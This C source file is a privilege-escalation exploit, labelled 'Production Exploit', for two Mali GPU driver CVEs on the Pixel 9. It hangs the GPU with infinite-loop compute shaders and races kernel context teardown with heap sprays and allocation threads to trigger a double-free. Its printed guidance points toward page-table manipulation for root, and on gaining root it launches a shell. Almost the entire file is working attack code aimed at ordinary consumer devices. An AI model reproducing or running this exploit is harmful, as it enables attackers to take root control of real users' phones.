/*
 * CVE-2025-6349 / CVE-2025-8045 — Strategy 3: GPU Hang Trigger
 * Pixel 9 (Tokay) Mali GPU r54p0 — Production Exploit
 *
 * Approach: Dispatch an infinite-loop compute shader via OpenGL ES 3.1
 * to hang the CSF. After ~3s the Mali watchdog fires, calling
 * kbasep_csf_cpu_queue_dump_print(). The teardown race triggers
 * the double-free in kbase_csf_cpu_queue_dump_buffer().
 *
 * All EGL/GLES symbols resolved at runtime via dlopen/dlsym.
 * Must be built with Android NDK (Bionic) for proper dlopen support.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <dlfcn.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/un.h>

typedef uint64_t u64;
typedef uint32_t u32;
typedef uint16_t u16;
typedef uint8_t  u8;
typedef int32_t  s32;

/* ── Mali ioctl definitions (r54p0, UK 1.36) ──────────────────────── */

#define MALI_DEVICE         "/dev/mali0"
#define KBASE_IOCTL_TYPE    0x80

#define KBASE_IOCTL_VERSION_CHECK      _IOWR(KBASE_IOCTL_TYPE, 52, struct kbase_ioctl_version_check)
#define KBASE_IOCTL_SET_FLAGS          _IOW(KBASE_IOCTL_TYPE, 1, struct kbase_ioctl_set_flags)
#define KBASE_IOCTL_MEM_ALLOC          _IOWR(KBASE_IOCTL_TYPE, 5, union kbase_ioctl_mem_alloc)
#define KBASE_IOCTL_KCPU_QUEUE_CREATE  _IOR(KBASE_IOCTL_TYPE, 45, struct kbase_ioctl_kcpu_queue_new)

#define BASE_MEM_PROT_CPU_RD  (1u << 0)
#define BASE_MEM_PROT_CPU_WR  (1u << 1)
#define BASE_MEM_PROT_GPU_RD  (1u << 2)
#define BASE_MEM_PROT_GPU_WR  (1u << 3)

#define MEM_ALLOC_FLAGS (BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR | \
                         BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR)

struct kbase_ioctl_version_check { u16 major; u16 minor; };
struct kbase_ioctl_set_flags { u32 create_flags; };
union kbase_ioctl_mem_alloc {
    struct { u64 va_pages; u64 commit_pages; u64 extension; u64 flags; } in;
    struct { u64 flags; u64 gpu_va; } out;
};
struct kbase_ioctl_kcpu_queue_new { u8 id; u8 padding[7]; };

/* ── EGL type definitions ──────────────────────────────────────────── */

typedef void*   EGLDisplay;
typedef void*   EGLConfig;
typedef void*   EGLContext;
typedef void*   EGLSurface;
typedef void*   EGLNativeDisplayType;
typedef s32     EGLint;
typedef u32     EGLBoolean;

#define EGL_DEFAULT_DISPLAY    ((EGLNativeDisplayType)0)
#define EGL_NO_DISPLAY         ((EGLDisplay)0)
#define EGL_NO_CONTEXT         ((EGLContext)0)
#define EGL_NO_SURFACE         ((EGLSurface)0)
#define EGL_SURFACE_TYPE       0x3033
#define EGL_PBUFFER_BIT        0x0001
#define EGL_RENDERABLE_TYPE    0x3040
#define EGL_OPENGL_ES3_BIT     0x0040
#define EGL_NONE               0x3038
#define EGL_WIDTH              0x3057
#define EGL_HEIGHT             0x3056
#define EGL_CONTEXT_CLIENT_VERSION 0x3098

/* ── GLES type definitions ─────────────────────────────────────────── */

typedef u32     GLenum;
typedef s32     GLint;
typedef u32     GLuint;
typedef s32     GLsizei;
typedef u32     GLbitfield;
typedef char    GLchar;

#define GL_COMPUTE_SHADER          0x91B9
#define GL_COMPILE_STATUS          0x8B81
#define GL_LINK_STATUS             0x8B82
#define GL_INFO_LOG_LENGTH         0x8B84
#define GL_TRUE                    1
#define GL_FALSE                   0
#define GL_SHADER_STORAGE_BUFFER   0x90D2
#define GL_DYNAMIC_DRAW            0x88E8

/* ── Function pointer types ────────────────────────────────────────── */

typedef EGLDisplay  (*PFN_eglGetDisplay)(EGLNativeDisplayType);
typedef EGLBoolean  (*PFN_eglInitialize)(EGLDisplay, EGLint*, EGLint*);
typedef EGLBoolean  (*PFN_eglChooseConfig)(EGLDisplay, const EGLint*, EGLConfig*, EGLint, EGLint*);
typedef EGLSurface  (*PFN_eglCreatePbufferSurface)(EGLDisplay, EGLConfig, const EGLint*);
typedef EGLContext  (*PFN_eglCreateContext)(EGLDisplay, EGLConfig, EGLContext, const EGLint*);
typedef EGLBoolean  (*PFN_eglMakeCurrent)(EGLDisplay, EGLSurface, EGLSurface, EGLContext);
typedef EGLBoolean  (*PFN_eglDestroyContext)(EGLDisplay, EGLContext);
typedef EGLBoolean  (*PFN_eglDestroySurface)(EGLDisplay, EGLSurface);
typedef EGLBoolean  (*PFN_eglTerminate)(EGLDisplay);

typedef GLuint      (*PFN_glCreateShader)(GLenum);
typedef void        (*PFN_glShaderSource)(GLuint, GLsizei, const GLchar* const*, const GLint*);
typedef void        (*PFN_glCompileShader)(GLuint);
typedef void        (*PFN_glGetShaderiv)(GLuint, GLenum, GLint*);
typedef void        (*PFN_glGetShaderInfoLog)(GLuint, GLsizei, GLsizei*, GLchar*);
typedef GLuint      (*PFN_glCreateProgram)(void);
typedef void        (*PFN_glAttachShader)(GLuint, GLuint);
typedef void        (*PFN_glLinkProgram)(GLuint);
typedef void        (*PFN_glGetProgramiv)(GLuint, GLenum, GLint*);
typedef void        (*PFN_glGetProgramInfoLog)(GLuint, GLsizei, GLsizei*, GLchar*);
typedef void        (*PFN_glUseProgram)(GLuint);
typedef void        (*PFN_glDispatchCompute)(GLuint, GLuint, GLuint);
typedef void        (*PFN_glMemoryBarrier)(GLbitfield);
typedef void        (*PFN_glDeleteShader)(GLuint);
typedef void        (*PFN_glDeleteProgram)(GLuint);
typedef void        (*PFN_glGenBuffers)(GLsizei, GLuint*);
typedef void        (*PFN_glBindBuffer)(GLenum, GLuint);
typedef void        (*PFN_glBufferData)(GLenum, GLsizei, const void*, GLenum);
typedef void        (*PFN_glBindBufferBase)(GLenum, GLuint, GLuint);
typedef void        (*PFN_glFinish)(void);
typedef void        (*PFN_glFlush)(void);

/* ── Loaded function pointers ──────────────────────────────────────── */

static PFN_eglGetDisplay           p_eglGetDisplay;
static PFN_eglInitialize          p_eglInitialize;
static PFN_eglChooseConfig        p_eglChooseConfig;
static PFN_eglCreatePbufferSurface p_eglCreatePbufferSurface;
static PFN_eglCreateContext       p_eglCreateContext;
static PFN_eglMakeCurrent         p_eglMakeCurrent;
static PFN_eglDestroyContext      p_eglDestroyContext;
static PFN_eglDestroySurface      p_eglDestroySurface;
static PFN_eglTerminate           p_eglTerminate;

static PFN_glCreateShader          p_glCreateShader;
static PFN_glShaderSource          p_glShaderSource;
static PFN_glCompileShader        p_glCompileShader;
static PFN_glGetShaderiv          p_glGetShaderiv;
static PFN_glGetShaderInfoLog     p_glGetShaderInfoLog;
static PFN_glCreateProgram        p_glCreateProgram;
static PFN_glAttachShader         p_glAttachShader;
static PFN_glLinkProgram          p_glLinkProgram;
static PFN_glGetProgramiv         p_glGetProgramiv;
static PFN_glGetProgramInfoLog    p_glGetProgramInfoLog;
static PFN_glUseProgram           p_glUseProgram;
static PFN_glDispatchCompute      p_glDispatchCompute;
static PFN_glMemoryBarrier        p_glMemoryBarrier;
static PFN_glDeleteShader         p_glDeleteShader;
static PFN_glDeleteProgram        p_glDeleteProgram;
static PFN_glGenBuffers           p_glGenBuffers;
static PFN_glBindBuffer           p_glBindBuffer;
static PFN_glBufferData           p_glBufferData;
static PFN_glBindBufferBase       p_glBindBufferBase;
static PFN_glFinish              p_glFinish;
static PFN_glFlush               p_glFlush;

/* ── Compute shader sources (SSBO-backed infinite loops) ───────────── */

static const GLchar *hang_shader_src =
    "#version 310 es\n"
    "layout(local_size_x = 4, local_size_y = 4, local_size_z = 1) in;\n"
    "layout(std430, binding = 0) buffer HangBuf { uint counter[]; };\n"
    "void main() {\n"
    "    uint idx = gl_LocalInvocationIndex;\n"
    "    if (idx < 15u) {\n"
    "        for (uint i = 0u; i < 1000000000u; i++) {\n"
    "            counter[idx] = counter[idx] + 1u;\n"
    "        }\n"
    "        while (true) {\n"
    "            counter[idx] = counter[idx] + 1u;\n"
    "        }\n"
    "    }\n"
    "    barrier();\n"
    "    counter[idx] = 42u;\n"
    "}\n";

static const GLchar *hang_shader_src_v2 =
    "#version 310 es\n"
    "layout(local_size_x = 32, local_size_y = 1, local_size_z = 1) in;\n"
    "layout(std430, binding = 0) buffer LockBuf { uint data[]; };\n"
    "void main() {\n"
    "    if (gl_LocalInvocationIndex > 0u) {\n"
    "        data[0] = atomicAdd(data[0], 1u);\n"
    "        while (true) { memoryBarrier(); }\n"
    "    }\n"
    "    barrier();\n"
    "    data[0] = 0u;\n"
    "}\n";

static const GLchar *hang_shader_src_v3 =
    "#version 310 es\n"
    "layout(local_size_x = 1, local_size_y = 1, local_size_z = 1) in;\n"
    "layout(std430, binding = 0) buffer SpinBuf { uint spin[]; };\n"
    "void main() {\n"
    "    spin[0] = 1u;\n"
    "    memoryBarrierBufferObject();\n"
    "    while (spin[0] == 1u) { memoryBarrierBufferObject(); }\n"
    "}\n";

/* ── Globals ───────────────────────────────────────────────────────── */

static int  g_mali_fd = -1;
static volatile int g_race_won = 0;
static volatile int g_gpu_hanging = 0;
static volatile int g_strike_now = 0;
static volatile int g_glfinish_done = 0;
static volatile int g_spray_active = 0;

#define NUM_STRIKE_THREADS  10
#define RECLAIM_ATTEMPTS    240
#define HANG_WAIT_SECONDS   8

/* ── Mali GPU memory allocation helper ──────────────────────────────── */

static u64 mali_mem_alloc(int fd) {
    union kbase_ioctl_mem_alloc req = {0};
    req.in.va_pages = 1;
    req.in.commit_pages = 1;
    req.in.flags = MEM_ALLOC_FLAGS;
    req.in.extension = 0;
    if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &req) < 0) {
        return 0;
    }
    return req.out.gpu_va;
}

/* ── Load EGL + GLES function pointers ─────────────────────────────── */

static int load_egl_gles(void) {
    setenv("LD_LIBRARY_PATH",
           "/system/lib64:/system/lib:/vendor/lib64:/vendor/lib:"
           "/apex/com.android.runtime/lib64:/apex/com.android.art/lib64",
           1);

    printf("[*] Preloading Android dependency chain...\n");

    static const char *preload_deps[] = {
        "/system/lib64/liblog.so",
        "/system/lib64/libbase.so",
        "/system/lib64/libcutils.so",
        "/system/lib64/libutils.so",
        "/system/lib64/libnativewindow.so",
        "/system/lib64/libhardware.so",
        "/system/lib64/libsync.so",
        "/vendor/lib64/libutils.so",
        "/vendor/lib64/libcutils.so",
        NULL
    };

    for (int i = 0; preload_deps[i]; i++) {
        void *h = dlopen(preload_deps[i], RTLD_LAZY | RTLD_GLOBAL);
        if (h) {
            printf("[+]   Preloaded %s\n", preload_deps[i]);
        }
    }

    void *libegl = NULL;
    static const char *egl_paths[] = {
        "/system/lib64/libEGL.so",
        "/vendor/lib64/libEGL.so",
        "libEGL.so",
        NULL
    };
    for (int i = 0; egl_paths[i]; i++) {
        libegl = dlopen(egl_paths[i], RTLD_LAZY);
        if (libegl) {
            printf("[+] Loaded libEGL.so via %s\n", egl_paths[i]);
            break;
        }
    }
    if (!libegl) {
        printf("[-] dlopen libEGL.so: %s\n", dlerror());
        return -1;
    }

    void *libgles = NULL;
    static const char *gles_paths[] = {
        "/system/lib64/libGLESv2.so",
        "/vendor/lib64/libGLESv2.so",
        "libGLESv2.so",
        NULL
    };
    for (int i = 0; gles_paths[i]; i++) {
        libgles = dlopen(gles_paths[i], RTLD_LAZY);
        if (libgles) {
            printf("[+] Loaded GLES via %s\n", gles_paths[i]);
            break;
        }
    }
    if (!libgles) {
        printf("[-] dlopen libGLES: %s\n", dlerror());
        return -1;
    }

#define LOAD_EGL(name) \
    p_##name = (PFN_##name)dlsym(libegl, #name); \
    if (!p_##name) { printf("[-] dlsym " #name ": %s\n", dlerror()); return -1; }

    LOAD_EGL(eglGetDisplay);
    LOAD_EGL(eglInitialize);
    LOAD_EGL(eglChooseConfig);
    LOAD_EGL(eglCreatePbufferSurface);
    LOAD_EGL(eglCreateContext);
    LOAD_EGL(eglMakeCurrent);
    LOAD_EGL(eglDestroyContext);
    LOAD_EGL(eglDestroySurface);
    LOAD_EGL(eglTerminate);

#define LOAD_GLES(name) \
    p_##name = (PFN_##name)dlsym(libgles, #name); \
    if (!p_##name) { printf("[-] dlsym " #name ": %s\n", dlerror()); return -1; }

    LOAD_GLES(glCreateShader);
    LOAD_GLES(glShaderSource);
    LOAD_GLES(glCompileShader);
    LOAD_GLES(glGetShaderiv);
    LOAD_GLES(glGetShaderInfoLog);
    LOAD_GLES(glCreateProgram);
    LOAD_GLES(glAttachShader);
    LOAD_GLES(glLinkProgram);
    LOAD_GLES(glGetProgramiv);
    LOAD_GLES(glGetProgramInfoLog);
    LOAD_GLES(glUseProgram);
    LOAD_GLES(glDispatchCompute);
    LOAD_GLES(glMemoryBarrier);
    LOAD_GLES(glDeleteShader);
    LOAD_GLES(glDeleteProgram);
    LOAD_GLES(glGenBuffers);
    LOAD_GLES(glBindBuffer);
    LOAD_GLES(glBufferData);
    LOAD_GLES(glBindBufferBase);
    LOAD_GLES(glFinish);
    LOAD_GLES(glFlush);

    printf("[+] All EGL/GLES functions loaded\n");
    return 0;
}

/* ── Dispatch infinite-loop compute shader ─────────────────────────── */

static int dispatch_hang_shader(u64 target_va) {
    EGLDisplay display;
    EGLConfig config;
    EGLContext context;
    EGLSurface surface;
    EGLint major, minor;
    EGLint num_configs;

    display = p_eglGetDisplay(EGL_DEFAULT_DISPLAY);
    if (display == EGL_NO_DISPLAY) {
        printf("[-] eglGetDisplay failed\n");
        return -1;
    }

    if (!p_eglInitialize(display, &major, &minor)) {
        printf("[-] eglInitialize failed\n");
        return -1;
    }
    printf("[+] EGL initialized: %d.%d\n", major, minor);

    EGLint config_attribs[] = {
        EGL_SURFACE_TYPE,  EGL_PBUFFER_BIT,
        EGL_RENDERABLE_TYPE, EGL_OPENGL_ES3_BIT,
        EGL_NONE
    };

    if (!p_eglChooseConfig(display, config_attribs, &config, 1, &num_configs)) {
        printf("[-] eglChooseConfig failed\n");
        return -1;
    }
    printf("[+] EGL config chosen (num=%d)\n", num_configs);

    EGLint pbuffer_attribs[] = {
        EGL_WIDTH,  1,
        EGL_HEIGHT, 1,
        EGL_NONE
    };

    surface = p_eglCreatePbufferSurface(display, config, pbuffer_attribs);
    if (surface == EGL_NO_SURFACE) {
        printf("[-] eglCreatePbufferSurface failed\n");
        return -1;
    }

    EGLint ctx_attribs[] = {
        EGL_CONTEXT_CLIENT_VERSION, 3,
        EGL_NONE
    };

    context = p_eglCreateContext(display, config, EGL_NO_CONTEXT, ctx_attribs);
    if (context == EGL_NO_CONTEXT) {
        printf("[-] eglCreateContext failed\n");
        return -1;
    }
    printf("[+] EGL context created (ES 3.x)\n");

    if (!p_eglMakeCurrent(display, surface, surface, context)) {
        printf("[-] eglMakeCurrent failed\n");
        return -1;
    }
    printf("[+] EGL context made current\n");

    const GLchar *src_list[] = { hang_shader_src, hang_shader_src_v2, hang_shader_src_v3 };
    const char *name_list[] = {
        "barrier-deadlock (15/16 spin)",
        "barrier-deadlock v2 (31/32 spin)",
        "spin-loop (wait for buffer clear)"
    };
    GLuint shader = 0;
    int shader_idx = -1;

    for (int si = 0; si < 3; si++) {
        shader = p_glCreateShader(GL_COMPUTE_SHADER);
        if (!shader) {
            printf("[-] glCreateShader failed\n");
            return -1;
        }

        printf("[*] Trying shader v%d: %s\n", si+1, name_list[si]);
        const GLchar *src = src_list[si];
        p_glShaderSource(shader, 1, &src, NULL);
        p_glCompileShader(shader);

        GLint compiled = 0;
        p_glGetShaderiv(shader, GL_COMPILE_STATUS, &compiled);
        if (compiled) {
            shader_idx = si;
            printf("[+] Shader v%d compiled successfully!\n", si+1);
            break;
        }

        char log[512];
        p_glGetShaderInfoLog(shader, sizeof(log), NULL, log);
        printf("[-] Shader v%d compile failed: %s\n", si+1, log);
        p_glDeleteShader(shader);
        shader = 0;

        if (si == 2) {
            printf("[-] All shader variants failed\n");
            return -1;
        }
    }

    GLuint program = p_glCreateProgram();
    p_glAttachShader(program, shader);
    p_glLinkProgram(program);

    GLint linked = 0;
    p_glGetProgramiv(program, GL_LINK_STATUS, &linked);
    if (!linked) {
        char log[512];
        p_glGetProgramInfoLog(program, sizeof(log), NULL, log);
        printf("[-] Program link failed: %s\n", log);
        return -1;
    }
    printf("[+] Compute program linked\n");

    p_glUseProgram(program);

    GLuint ssbo;
    p_glGenBuffers(1, &ssbo);
    p_glBindBuffer(GL_SHADER_STORAGE_BUFFER, ssbo);
    GLuint zero_buf[256] = {0};
    p_glBufferData(GL_SHADER_STORAGE_BUFFER, sizeof(zero_buf), zero_buf, GL_DYNAMIC_DRAW);
    p_glBindBufferBase(GL_SHADER_STORAGE_BUFFER, 0, ssbo);
    printf("[+] SSBO created and bound (binding=0, %zu bytes)\n", sizeof(zero_buf));

    void *ssbo_ptr = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                          MAP_SHARED, g_mali_fd, target_va);
    if (ssbo_ptr != MAP_FAILED) {
        printf("[+] GPU VA 0x%llx mmap'd to userspace at %p\n",
               (unsigned long long)target_va, ssbo_ptr);
        memset(ssbo_ptr, 0, 256);
    } else {
        printf("[!] mmap of GPU VA failed: %s (continuing anyway)\n", strerror(errno));
        ssbo_ptr = NULL;
    }

    p_glFlush();

    printf("[*] Dispatching hang shader (v%d: %s)...\n",
           shader_idx + 1, name_list[shader_idx]);

    if (shader_idx < 2) {
        p_glDispatchCompute(256, 1, 1);
    } else {
        p_glDispatchCompute(1, 1, 1);
    }
    p_glFlush();

    printf("[+] Compute shader dispatched!\n");

    if (ssbo_ptr) {
        printf("[*] Unmapping SSBO GPU buffer while shader runs → GPU page fault!\n");
        usleep(100000);
        munmap(ssbo_ptr, 4096);
        printf("[+] SSBO buffer unmapped — GPU will fault on next SSBO access!\n");
    }

    printf("[*] GPU should now hang — page fault in CSF → watchdog!\n\n");

    g_gpu_hanging = 1;
    return 0;
}

/* ── Strike thread: spray GPU allocations per-context ──────────────── */

static void* phalanx_strike(void* arg) {
    (void)arg;
    while (!g_strike_now) usleep(100);

    int fd = open(MALI_DEVICE, O_RDWR);
    if (fd < 0) fd = open("/dev/mali", O_RDWR);
    if (fd < 0) {
        printf("[!] [Strike] Cannot open Mali: %s\n", strerror(errno));
        return NULL;
    }

    struct kbase_ioctl_set_flags fl = {0};
    ioctl(fd, KBASE_IOCTL_SET_FLAGS, &fl);

    for (int i = 0; i < RECLAIM_ATTEMPTS && !g_race_won; i++) {
        u64 gpu_va = mali_mem_alloc(fd);
        if (gpu_va == 0) {
            if (i > 0 && (i % 50 == 0)) {
                printf("[*] [Strike] Cookie pool likely exhausted at iter %d (ok)\n", i);
            }
            usleep(500);
            continue;
        }
        if (i < 5 || i % 50 == 0) {
            printf("[*] [Strike] GPU VA 0x%llx (iter %d)\n",
                   (unsigned long long)gpu_va, i);
        }
    }

    close(fd);
    return NULL;
}

/* ── Memory pressure thread (separate context) ─────────────────────── */

static void* mem_pressure_thread(void* arg) {
    (void)arg;
    while (!g_gpu_hanging) usleep(1000);

    int fd = open(MALI_DEVICE, O_RDWR);
    if (fd < 0) fd = open("/dev/mali", O_RDWR);
    if (fd < 0) return NULL;

    struct kbase_ioctl_set_flags fl = {0};
    ioctl(fd, KBASE_IOCTL_SET_FLAGS, &fl);

    printf("[*] Memory pressure thread active\n");

    int count = 0;
    for (int round = 0; round < 10 && !g_race_won; round++) {
        for (int i = 0; i < 24 && count < 240; i++) {
            u64 va = mali_mem_alloc(fd);
            if (va != 0) count++;
        }
        usleep(50000);
    }

    printf("[*] Memory pressure: allocated %d GPU pages\n", count);
    close(fd);
    return NULL;
}

/* ── Kernel heap spray via sendmsg + SCM_RIGHTS ─────────────────────── */

static int kernel_heap_spray_sendmsg(int target_fd) {
    int sv[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) < 0)
        return -1;

    struct msghdr msg = {0};
    struct iovec iov = {0};
    char buf[1] = {0};
    iov.iov_base = buf;
    iov.iov_len = 1;
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    char cmsg_buf[CMSG_SPACE(sizeof(int))];
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = sizeof(cmsg_buf);

    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    *(int *)CMSG_DATA(cmsg) = target_fd;

    if (sendmsg(sv[0], &msg, 0) < 0) {
        close(sv[0]);
        close(sv[1]);
        return -1;
    }

    close(sv[0]);
    close(sv[1]);
    return 0;
}

static void* heap_spray_thread(void* arg) {
    (void)arg;
    while (!g_spray_active) usleep(100);

    printf("[*] Kernel heap spray thread active\n");

    int spray_fd = open("/dev/mali0", O_RDWR);
    if (spray_fd < 0) spray_fd = open("/dev/mali", O_RDWR);

    for (int i = 0; i < 500 && !g_race_won; i++) {
        if (spray_fd >= 0) {
            kernel_heap_spray_sendmsg(spray_fd);
            mali_mem_alloc(spray_fd);
        }
        kernel_heap_spray_sendmsg(g_mali_fd);
    }

    printf("[*] Kernel heap spray done\n");
    if (spray_fd >= 0) close(spray_fd);
    return NULL;
}

/* ── KCPU queue race: close kctx during watchdog window ────────────── */

static void* kcpu_race_thread(void* arg) {
    (void)arg;
    while (!g_gpu_hanging) usleep(1000);
    usleep(2000000);

    int race_fd = open(MALI_DEVICE, O_RDWR);
    if (race_fd < 0) race_fd = open("/dev/mali", O_RDWR);
    if (race_fd < 0) {
        printf("[!] KCPU race: cannot open separate Mali FD\n");
        return NULL;
    }

    struct kbase_ioctl_set_flags fl = {0};
    ioctl(race_fd, KBASE_IOCTL_SET_FLAGS, &fl);

    struct kbase_ioctl_kcpu_queue_new kq = {0};
    int ret = ioctl(race_fd, KBASE_IOCTL_KCPU_QUEUE_CREATE, &kq);
    if (ret < 0) {
        printf("[!] KCPU race: queue create failed: errno=%d\n", errno);
        close(race_fd);
        return NULL;
    }
    printf("[*] KCPU race: created queue id=%d on separate FD=%d\n", kq.id, race_fd);

    usleep(1000000);

    printf("[*] KCPU race: closing FD=%d during watchdog window!\n", race_fd);
    close(race_fd);
    printf("[*] KCPU race: FD closed — driver kctx teardown races with watchdog!\n");

    return NULL;
}

/* ── glFinish check: verify GPU is truly hung ──────────────────────── */

static void* glfinish_thread(void* arg) {
    (void)arg;
    while (!g_gpu_hanging) usleep(1000);

    printf("[*] glFinish thread: calling glFinish() (blocks until GPU idle)...\n");
    p_glFinish();
    g_glfinish_done = 1;
    printf("[!] glFinish returned — GPU completed! Shader did NOT truly hang.\n");
    return NULL;
}

/* ── Main ───────────────────────────────────────────────────────────── */

int main(int argc, char **argv) {
    int hang_wait = (argc > 1) ? atoi(argv[1]) : HANG_WAIT_SECONDS;

    printf("========================================================\n");
    printf("CVE-2025-6349/8045 — Strategy 3: GPU Hang Trigger\n");
    printf("Pixel 9 (Tokay) Mali r54p0 — Production Exploit\n");
    printf("Hang wait: %ds | Strike threads: %d\n",
           hang_wait, NUM_STRIKE_THREADS);
    printf("========================================================\n\n");

    /* ── Step 1: Open Mali device ──────────────────────────────────── */

    g_mali_fd = open(MALI_DEVICE, O_RDWR);
    if (g_mali_fd < 0) {
        g_mali_fd = open("/dev/mali", O_RDWR);
    }
    if (g_mali_fd < 0) {
        perror("[-] Cannot open Mali device");
        return 1;
    }
    printf("[+] Mali FD: %d\n", g_mali_fd);

    struct kbase_ioctl_version_check ver = {0};
    if (ioctl(g_mali_fd, KBASE_IOCTL_VERSION_CHECK, &ver) < 0) {
        printf("[-] Version check failed\n");
    } else {
        printf("[+] Driver version: %u.%u\n", ver.major, ver.minor);
    }

    struct kbase_ioctl_set_flags fl = {0};
    ioctl(g_mali_fd, KBASE_IOCTL_SET_FLAGS, &fl);

    /* ── Step 2: Create KCPU queue ─────────────────────────────────── */

    printf("\n[*] Step 1: Creating KCPU queue...\n");
    struct kbase_ioctl_kcpu_queue_new kcpu = {0};
    int kcpu_ret = ioctl(g_mali_fd, KBASE_IOCTL_KCPU_QUEUE_CREATE, &kcpu);
    if (kcpu_ret == 0) {
        printf("[+] KCPU queue created: id=%d\n", kcpu.id);
    } else {
        printf("[!] KCPU queue create failed: errno=%d (%s)\n", errno, strerror(errno));
    }

    /* ── Step 3: Pre-allocate GPU memory ────────────────────────────── */

    printf("\n[*] Step 2: Pre-allocating GPU memory...\n");
    u64 target_va = mali_mem_alloc(g_mali_fd);
    if (target_va == 0) {
        printf("[-] GPU memory allocation failed\n");
        close(g_mali_fd);
        return 1;
    }
    printf("[+] Target GPU VA: 0x%llx\n", (unsigned long long)target_va);

    /* ── Step 4: Load EGL/GLES and dispatch hang shader ────────────── */

    printf("\n[*] Step 3: Loading EGL/GLES...\n");
    if (load_egl_gles() < 0) {
        printf("[-] Cannot load EGL/GLES. Trying Mali-only fallback...\n");
        printf("[*] Fallback: rapid allocation race without GPU hang\n\n");
        g_gpu_hanging = 1;
        goto fallback_race;
    }

    printf("\n[*] Step 4: Dispatching GPU hang shader...\n");
    if (dispatch_hang_shader(target_va) < 0) {
        printf("[-] Shader dispatch failed. Trying fallback...\n");
        g_gpu_hanging = 1;
        goto fallback_race;
    }

    /* ── Step 5: Launch race threads while GPU hangs ────────────────── */

    printf("\n[*] Step 5: GPU hanging. Launching race threads...\n");
    printf("[*] Watchdog will fire in ~3s. Race window opening...\n\n");

    pthread_t strike_th[NUM_STRIKE_THREADS];
    pthread_t pressure_th;
    pthread_t spray_th;
    pthread_t kcpu_th;
    pthread_t glfinish_th;

    g_strike_now = 1;
    g_spray_active = 1;

    for (int i = 0; i < NUM_STRIKE_THREADS; i++) {
        pthread_create(&strike_th[i], NULL, phalanx_strike, NULL);
    }
    pthread_create(&pressure_th, NULL, mem_pressure_thread, NULL);
    pthread_create(&spray_th, NULL, heap_spray_thread, NULL);
    pthread_create(&kcpu_th, NULL, kcpu_race_thread, NULL);
    pthread_create(&glfinish_th, NULL, glfinish_thread, NULL);

    /* ── Step 6: Wait for watchdog + race window ───────────────────── */

    printf("[*] Step 6: Waiting %ds for watchdog timeout + race...\n\n",
           hang_wait);

    for (int s = 0; s < hang_wait && !g_race_won; s++) {
        sleep(1);
        if (g_glfinish_done && s > 0) {
            printf("[!] glFinish completed at %ds — GPU was NOT truly hung!\n", s);
            break;
        }
        if (s == 2) {
            printf("[*] 3s elapsed — watchdog should be firing now!\n");
        }
        if (s == 4) {
            printf("[*] 5s elapsed — dump_print timeout likely hit\n");
        }
    }

    /* ── Step 7: Join threads ──────────────────────────────────────── */

    for (int i = 0; i < NUM_STRIKE_THREADS; i++) {
        pthread_join(strike_th[i], NULL);
    }
    pthread_join(pressure_th, NULL);
    pthread_join(spray_th, NULL);
    pthread_join(kcpu_th, NULL);
    pthread_join(glfinish_th, NULL);

    goto results;

fallback_race:
    printf("[*] Fallback: Rapid allocation spray + heap spray (no GPU hang)\n\n");

    {
        pthread_t fb_th[NUM_STRIKE_THREADS];
        pthread_t fb_spray_th;
        g_strike_now = 1;
        g_spray_active = 1;

        for (int i = 0; i < NUM_STRIKE_THREADS; i++) {
            pthread_create(&fb_th[i], NULL, phalanx_strike, NULL);
        }
        pthread_create(&fb_spray_th, NULL, heap_spray_thread, NULL);

        for (int s = 0; s < 3 && !g_race_won; s++) {
            sleep(1);
            printf("[*] Fallback spray running... %ds\n", s+1);
        }

        for (int i = 0; i < NUM_STRIKE_THREADS; i++) {
            pthread_join(fb_th[i], NULL);
        }
        pthread_join(fb_spray_th, NULL);
    }

results:
    printf("\n========================================================\n");
    printf("RESULTS\n");
    printf("========================================================\n\n");

    if (g_race_won) {
        printf("[!!!] UAF CONFIRMED — corrupted page detected!\n");
        printf("[!!!] Double-free race succeeded!\n\n");
        printf("[*] Next steps:\n");
        printf("  1. Check dmesg: adb shell dmesg | grep -i 'kasan\\|double-free\\|use-after-free'\n");
        printf("  2. Look for: kbase_csf_cpu_queue_dump_buffer+0x1d4\n");
        printf("  3. Proceed to page table manipulation for root\n");
    } else {
        printf("[*] No UAF detected in this run\n\n");
        if (g_glfinish_done) {
            printf("[!] GPU completed — shader did NOT cause real hang.\n");
            printf("[!] The Mali driver preempted/terminated the shader.\n\n");
            printf("Possible next steps:\n");
            printf("  - Use Vulkan compute (libvulkan.so) instead of GLES\n");
            printf("  - Try different shader patterns (barrier deadlocks)\n");
            printf("  - Use multiple GL contexts to exhaust GPU resources\n");
        } else {
            printf("Possible reasons:\n");
            printf("  - Race window missed (timing issue)\n");
            printf("  - KASAN may prevent exploitation\n");
            printf("  - Production driver may have additional hardening\n\n");
            printf("Try:\n");
            printf("  - Run multiple times: for i in $(seq 1 100); do ./poc_strategy3_ndk; done\n");
            printf("  - Check dmesg: adb shell su -c 'dmesg | grep -iE mali|kbase|kasan'\n");
        }
    }

    printf("\n[*] UID: %d\n", getuid());
    if (getuid() == 0) {
        printf("[!!!] ROOT!\n");
        system("/system/bin/sh");
    }

    printf("\n[*] Expected dmesg on success:\n");
    printf("  kbase_csf_timeout: GPU hang detected\n");
    printf("  kbasep_csf_cpu_queue_dump_print: timeout (3000ms)\n");
    printf("  kasan: slab-use-after-free in kbase_csf_cpu_queue_dump_buffer\n");

    printf("\n[*] Check dmesg:\n");
    printf("  adb shell su -c 'dmesg | grep -iE \"kasan|use-after-free|double-free|mali|kbase|csf\"'\n");

    if (g_mali_fd >= 0) close(g_mali_fd);
    return g_race_won ? 0 : 1;
}
